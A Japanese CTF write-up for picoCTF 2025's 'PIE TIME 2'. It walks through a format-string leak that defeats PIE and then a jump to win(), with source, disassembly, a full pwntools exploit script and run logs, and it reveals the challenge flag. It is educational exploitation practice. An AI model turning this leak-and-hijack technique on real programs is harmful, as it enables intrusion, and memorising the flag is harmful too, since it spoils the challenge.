#### PIE TIME 2（200 points）

先ほどの問題と同様に、1つの C言語のソースコード（vuln.c）と、1つのバイナリプログラム（vuln）をダウンロードできます。また、サーバを起動して進める問題のようです。

<figure class="figure-image figure-image-fotolife" title="PIE TIME 2（200 points）">[f:id:daisuke20240310:20250315223320p:plain:alt=PIE TIME 2（200 points）]<figcaption>PIE TIME 2（200 points）</figcaption></figure>

まずは、ソースコードです。先ほどの問題と似てます。

call_functions関数で、名前を聞かれて、その後、任意のアドレスにジャンプできるようです。

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

表層解析を行います。

```sh
$ file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89c0ed5ed3766d1b85809c2bef48b6f5f0ef9364, for GNU/Linux 3.2.0, not stripped

$ ~/bin/checksec --file=vuln
RELRO       STACK CANARY  NX          PIE          RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Full RELRO  Canary found  NX enabled  PIE enabled  No RPATH  No RUNPATH  81 Symbols  No       0          2            vuln

$ pwn checksec --file=vuln
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

win関数のアドレスにジャンプしたいのですが、そのためには、このプログラムの何らかのアドレスを得る必要があります。先ほどは、main関数のアドレスを表示してくれていたので簡単でした。その代わりに、名前を入力するところで、スタックバッファオーバーフロー出来そうです。あ、書式文字列攻撃も出来そうです。これで任意の値を表示できそうです。

call_functions関数のアセンブラです。

```asm
pwndbg> disassemble 
Dump of assembler code for function call_functions:
   0x00005555555552c7 <+0>:	endbr64
   0x00005555555552cb <+4>:	push   rbp
   0x00005555555552cc <+5>:	mov    rbp,rsp
=> 0x00005555555552cf <+8>:	sub    rsp,0x60
   0x00005555555552d3 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x00005555555552dc <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x00005555555552e0 <+25>:	xor    eax,eax
   0x00005555555552e2 <+27>:	lea    rdi,[rip+0xd45]        # 0x55555555602e
   0x00005555555552e9 <+34>:	mov    eax,0x0
   0x00005555555552ee <+39>:	call   0x555555555140 <printf@plt>
   0x00005555555552f3 <+44>:	mov    rdx,QWORD PTR [rip+0x2d26]        # 0x555555558020 <stdin@@GLIBC_2.2.5>
   0x00005555555552fa <+51>:	lea    rax,[rbp-0x50]
   0x00005555555552fe <+55>:	mov    esi,0x40
   0x0000555555555303 <+60>:	mov    rdi,rax
   0x0000555555555306 <+63>:	call   0x555555555160 <fgets@plt>
   0x000055555555530b <+68>:	lea    rax,[rbp-0x50]
   0x000055555555530f <+72>:	mov    rdi,rax
   0x0000555555555312 <+75>:	mov    eax,0x0
   0x0000555555555317 <+80>:	call   0x555555555140 <printf@plt>
   0x000055555555531c <+85>:	lea    rdi,[rip+0xd1d]        # 0x555555556040
   0x0000555555555323 <+92>:	mov    eax,0x0
   0x0000555555555328 <+97>:	call   0x555555555140 <printf@plt>
   0x000055555555532d <+102>:	lea    rax,[rbp-0x60]
   0x0000555555555331 <+106>:	mov    rsi,rax
   0x0000555555555334 <+109>:	lea    rdi,[rip+0xd34]        # 0x55555555606f
   0x000055555555533b <+116>:	mov    eax,0x0
   0x0000555555555340 <+121>:	call   0x5555555551a0 <__isoc99_scanf@plt>
   0x0000555555555345 <+126>:	mov    rax,QWORD PTR [rbp-0x60]
   0x0000555555555349 <+130>:	mov    QWORD PTR [rbp-0x58],rax
   0x000055555555534d <+134>:	mov    rax,QWORD PTR [rbp-0x58]
   0x0000555555555351 <+138>:	call   rax
   0x0000555555555353 <+140>:	nop
   0x0000555555555354 <+141>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555555358 <+145>:	xor    rax,QWORD PTR fs:0x28
   0x0000555555555361 <+154>:	je     0x555555555368 <call_functions+161>
   0x0000555555555363 <+156>:	call   0x555555555130 <__stack_chk_fail@plt>
   0x0000555555555368 <+161>:	leave
   0x0000555555555369 <+162>:	ret
End of assembler dump.
```

call_functions関数のスタックを可視化します。これまで、上から順番に大きなアドレスから書いていましたが、今回から逆にして、上から順番に小さなアドレスから書いていきます。

| アドレス | サイズ | 内容 |
| - | - | - |
| rbp - 0x60 | 8 | val（rsp） |
| rbp - 0x58 | 8 | foo |
| rbp - 0x50 | 64 | buffer[64] |
| rbp - 0x10 | 8 | 空き |
| rbp - 0x08 | 8 | canary |
| rbp |

まず、GDB で vuln を動かして、スタックから main関数のアドレスを探します。見つけたら、書式文字列攻撃で、そのアドレスを表示させます。main関数のアドレスが分かれば、あとは先ほどの問題と同じです。

以下は、GDB で `printf(buffer)` を実行した直後の状態です。スタックを眺めてみると、rbp + 0x28 の位置に、main関数のアドレスがありました。これを書式文字列攻撃で表示させます。

```sh
────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
   0x555555555306 <call_functions+63>     call   fgets@plt                   <fgets@plt>
 
   0x55555555530b <call_functions+68>     lea    rax, [rbp - 0x50]     RAX => 0x7fffffffdd80 ?? 'AAAAAAAA,%22$p,%23$p,%24$p,%25$p\n'
   0x55555555530f <call_functions+72>     mov    rdi, rax              RDI => 0x7fffffffdd80 ?? 'AAAAAAAA,%22$p,%23$p,%24$p,%25$p\n'
   0x555555555312 <call_functions+75>     mov    eax, 0                EAX => 0
   0x555555555317 <call_functions+80>     call   printf@plt                  <printf@plt>
 
 ? 0x55555555531c <call_functions+85>     lea    rdi, [rip + 0xd1d]     RDI => 0x555555556040 ?? ' enter the address to jump to, ex => 0x12345: '
   0x555555555323 <call_functions+92>     mov    eax, 0                 EAX => 0
   0x555555555328 <call_functions+97>     call   printf@plt                  <printf@plt>
 
   0x55555555532d <call_functions+102>    lea    rax, [rbp - 0x60]
   0x555555555331 <call_functions+106>    mov    rsi, rax
   0x555555555334 <call_functions+109>    lea    rdi, [rip + 0xd34]     RDI => 0x55555555606f ?? 0x20756f5900786c25 /* '%lx' */
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdd70 ?? 0
01:0008│-058 0x7fffffffdd78 ?? 0x7ffff7f9c760 (_IO_2_1_stdout_) ?? 0xfbad2887
02:0010│-050 0x7fffffffdd80 ?? 'AAAAAAAA,%22$p,%23$p,%24$p,%25$p\n'
03:0018│-048 0x7fffffffdd88 ?? ',%22$p,%23$p,%24$p,%25$p\n'
04:0020│-040 0x7fffffffdd90 ?? '23$p,%24$p,%25$p\n'
05:0028│-038 0x7fffffffdd98 ?? '$p,%25$p\n'
06:0030│-030 0x7fffffffdda0 ?? 0x7ffff7f9000a ?? 0x280e0a440b48080e
07:0038│-028 0x7fffffffdda8 ?? 0x7ffff7e41079 (setvbuf+233) ?? cmp rax, 1
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ? 0   0x55555555531c call_functions+85
   1   0x555555555441 main+65
   2   0x7ffff7df024a __libc_start_call_main+122
   3   0x7ffff7df0305 __libc_start_main+133
   4   0x5555555551ee _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> tele 20
00:0000│ rsp 0x7fffffffdd70 ?? 0
01:0008│-058 0x7fffffffdd78 ?? 0x7ffff7f9c760 (_IO_2_1_stdout_) ?? 0xfbad2887
02:0010│-050 0x7fffffffdd80 ?? 'AAAAAAAA,%22$p,%23$p,%24$p,%25$p\n'
03:0018│-048 0x7fffffffdd88 ?? ',%22$p,%23$p,%24$p,%25$p\n'
04:0020│-040 0x7fffffffdd90 ?? '23$p,%24$p,%25$p\n'
05:0028│-038 0x7fffffffdd98 ?? '$p,%25$p\n'
06:0030│-030 0x7fffffffdda0 ?? 0x7ffff7f9000a ?? 0x280e0a440b48080e
07:0038│-028 0x7fffffffdda8 ?? 0x7ffff7e41079 (setvbuf+233) ?? cmp rax, 1
08:0040│-020 0x7fffffffddb0 ?? 0x7fffffffdef8 ?? 0x7fffffffe224 ?? '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/vuln'
09:0048│-018 0x7fffffffddb8 ?? 0x7fffffffdde0 ?? 1
0a:0050│-010 0x7fffffffddc0 ?? 0
0b:0058│-008 0x7fffffffddc8 ?? 0x23020f386e0b8b00
0c:0060│ rbp 0x7fffffffddd0 ?? 0x7fffffffdde0 ?? 1
0d:0068│+008 0x7fffffffddd8 ?? 0x555555555441 (main+65) ?? mov eax, 0
0e:0070│+010 0x7fffffffdde0 ?? 1
0f:0078│+018 0x7fffffffdde8 ?? 0x7ffff7df024a (__libc_start_call_main+122) ?? mov edi, eax
10:0080│+020 0x7fffffffddf0 ?? 0
11:0088│+028 0x7fffffffddf8 ?? 0x555555555400 (main) ?? endbr64 
12:0090│+030 0x7fffffffde00 ?? 0x100000000
13:0098│+038 0x7fffffffde08 ?? 0x7fffffffdef8 ?? 0x7fffffffe224 ?? '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/vuln'
```

名前の入力で、`AAAAAAAA,%22$p,%23$p,%24$p,%25$p` を入力します。正確な位置を考えずに、周辺のいくつかを出力しています。すると、`AAAAAAAA,(nil),0x555555555400,0x100000000,0x7fffffffdef8` と出力されました。`%23$p` でいいようです。

では、pwntools で実装していきます。以下のようになりました。

```python
#!/usr/bin/env python3
from pwn import *

bin_file = './vuln'
context( os = 'linux', arch = 'amd64' )
# context.log_level = 'debug'

binf                = ELF( bin_file )
addr_main_offset    = binf.functions['main'].address
addr_win_offset     = binf.functions['win'].address
#addr_got_setbuf    = binf.got['setbuf']
addr_bss            = binf.bss()

diff = addr_main_offset - addr_win_offset

info( f"addr_main_offset=0x{addr_main_offset:08X}, addr_win_offset=0x{addr_win_offset:08X}" )

def attack( proc, **kwargs ):
    
    proc.sendlineafter( ':', b'%23$p' )
    
    if True:
        addr = proc.recvline().decode('utf-8')
        info( f"type(addr)={type(addr)}, addr={addr}" )
        addr_main = int( addr, 16 )
    
    else:
        info( proc.recvline() )
        info( proc.recvline() )
        info( proc.recvline() )
    
    addr_win = addr_main - diff
    
    info( f"addr_main=0x{addr_main:08X}, addr_win=0x{addr_win:08X}" )
    
    proc.sendlineafter( ': ', hex(addr_win).encode('utf-8') )
    info( proc.recvline() )
    info( proc.recvline() )
    info( proc.recvline() )
    info( proc.recvline() )

def main():
    
    adrs = "rescued-float.picoctf.net"
    #adrs = "localhost"
    port = 55550
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    #proc = process( bin_file )
    proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
```

まず、ローカルで実行していきます。`proc = process( bin_file )` を有効にします。成功しました。

```sh
$ python pwnable_template.py
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] addr_main_offset=0x00001400, addr_win_offset=0x0000136A
[+] Starting local process './vuln': pid 160921
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] type(addr)=<class 'str'>, addr=0x5559882e3400
[*] addr_main=0x5559882E3400, addr_win=0x5559882E336A
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] You won!
[*] picoCTF{deadbeef}
[*] Process './vuln' stopped with exit code 0 (pid 160921)
Traceback (most recent call last):
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/pwnable_template.py", line 83, in <module>
    main()
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/pwnable_template.py", line 79, in main
    attack( proc )
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/pwnable_template.py", line 65, in attack
    info( proc.recvline() )
          ^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 498, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/process.py", line 742, in recv_raw
    raise EOFError
EOFError
```

では、サーバで実行します。`proc = remote( adrs, port )` を有効にします。

うーん、セグメンテーションフォールトが出ます。ローカルファイルではなく、socatコマンドでもやってみましたが、うまくいきます。なぜか、サーバの場合だけ、セグメンテーションフォールトになってしまいます。

```sh
$ python pwnable_template.py
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] addr_main_offset=0x00001400, addr_win_offset=0x0000136A
[q] Opening connection to rescued-float.picoctf.net on port 56065: Trying 3.20.7[+] Opening connection to rescued-float.picoctf.net on port 56065: Done
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] type(addr)=<class 'str'>, addr=0x7ffff7e04bd8
[*] addr_main=0x7FFFF7E04BD8, addr_win=0x7FFFF7E04B42
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] Segfault Occurred, incorrect address.
Traceback (most recent call last):
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/pwnable_template.py", line 83, in <module>
    main()
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/pwnable_template.py", line 79, in main
    attack( proc )
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/pwnable_template.py", line 64, in attack
    info( proc.recvline() )
          ^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 498, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to rescued-float.picoctf.net port 56065
```

サーバだけうまくいかない状況は初めてです。何か見落としているかもしれませんが、コンテストは明日までなので、残念ですが、先に進もうと思います。

<span style="color: #ff0000">2025/5/13：再挑戦</span>

当時は締め切りがせまっていたので、ゆっくり考えることが出来ませんでした。時間が出来たので、もう一度挑戦してみます。

まず、ローカル環境では、`%23` は main関数を示していました。そこで、デバッグ目的として、サーバ環境で、`proc.sendlineafter( 'name:', b'%19$p,%20$p,%21$p,%22$p,%23$p,%24$p' )` に変更して、動作させてみます。以下は、その結果です。

GDB で見た main関数のアドレスは、`0x555555555400` でした。サーバ環境では、`0x7ffca91d3988` が main関数のアドレスのはずですが、0x7ff... というのは、なんかアドレスがいつもと違うように思います。1つ後ろが、`0x100000000` ということで、位置としては、間違ってなさそうです。

```sh
b'0x631285f77441,(nil),0x71b6d9b28083,0x71b6d9d28620,0x7ffca91d3988,0x100000000\n'
```

先頭の `0x631285f77441` は、main関数への戻り番地（rbp の 1つ後ろ）です。同じ main関数のはずですが、アドレスが違いすぎます。戻り番地（main+65）の方を信用して、これを使って、main関数のアドレスを求める方法に変更してみます。

エクスプロイトコードは、以下に変更しました（attack関数のみ）。

単純に 65 を引けばいい、という考えです。

```python
def attack( proc, **kwargs ):
    
    #proc.sendlineafter( 'name:', b'%23$p' ) # main
    #proc.sendlineafter( 'name:', b'%19$p,%20$p,%21$p,%22$p,%23$p,%24$p' )
    proc.sendlineafter( 'name:', b'%19$p' ) # main+65
    
    if True:
        addr = proc.recvline().decode('utf-8')
        info( f"type(addr)={type(addr)}, addr={addr}" )
        addr_main = int( addr, 16 ) - 65
        #addr_main = unpack( proc.recv(6), 'all' )
    
    else:
        info( proc.recvline() )
        info( proc.recvline() )
        info( proc.recvline() )
    
    addr_win = addr_main - diff
    
    info( f"addr_main=0x{addr_main:08X}, addr_win=0x{addr_win:08X}" )
    
    proc.sendlineafter( ': ', hex(addr_win).encode('utf-8') )
    info( proc.recvline() )
    info( proc.recvline() )
    info( proc.recvline() )
    info( proc.recvline() )
```

では、実行してみます。

フラグが表示されました。今後は、戻り番地を使っていこうと思います。

```sh
$ python exploit_pie_time_2.py
[*] '/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] addr_main_offset=0x00001400, addr_win_offset=0x0000136A
[+] Opening connection to rescued-float.picoctf.net on port 49884: Done
/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[DEBUG] Received 0x10 bytes:
    b'Enter your name:'
[DEBUG] Sent 0x6 bytes:
    b'%19$p\n'
[DEBUG] Received 0x3d bytes:
    b'0x581ab79a1441\n'
    b' enter the address to jump to, ex => 0x12345: '
[*] type(addr)=<class 'str'>, addr=0x581ab79a1441
[*] addr_main=0x581AB79A1400, addr_win=0x581AB79A136A
[DEBUG] Sent 0xf bytes:
    b'0x581ab79a136a\n'
[DEBUG] Received 0x9 bytes:
    b'You won!\n'
/home/user/20240819/lib/python3.11/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] You won!
[DEBUG] Received 0x26 bytes:
    b"picoCTF{p13_5h0u1dn'7_134k_2509623b}\n"
    b'\n'
[*] picoCTF{p13_5h0u1dn'7_134k_2509623b}
[*]
Traceback (most recent call last):
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/exploit_pie_time_2.py", line 86, in <module>
    main()
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/exploit_pie_time_2.py", line 82, in main
    attack( proc )
  File "/home/user/svn/experiment/picoCTF/picoCTF2025_BinaryExploitation/PIE_TIME_2/exploit_pie_time_2.py", line 69, in attack
    info( proc.recvline() )
          ^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 498, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/user/20240819/lib/python3.11/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to rescued-float.picoctf.net port 49884
```
